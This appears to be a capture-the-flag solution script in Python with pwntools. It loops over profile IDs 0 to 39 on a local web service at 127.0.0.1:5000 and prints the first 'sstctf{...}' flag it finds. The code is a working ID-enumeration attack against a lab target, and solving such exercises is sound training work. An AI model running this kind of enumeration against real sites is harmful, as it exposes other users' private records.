from pwn import *

context.log_level = 'error'  # Suppress all logs except errors
for i in range(40):
    conn = remote('127.0.0.1', 5000)
    conn.send("GET /{} HTTP/1.1\r\nHost: http://127.0.0.1\r\n\r\n".format('profile?id='+str(i)).encode())
    response = conn.recvall()
    response = response.decode()
    if 'sstctf{' in response:
        start = response.find('sstctf{')
        end = response.find('}',start)
        print(response[start:end+1])
        conn.close()
        break
    conn.close()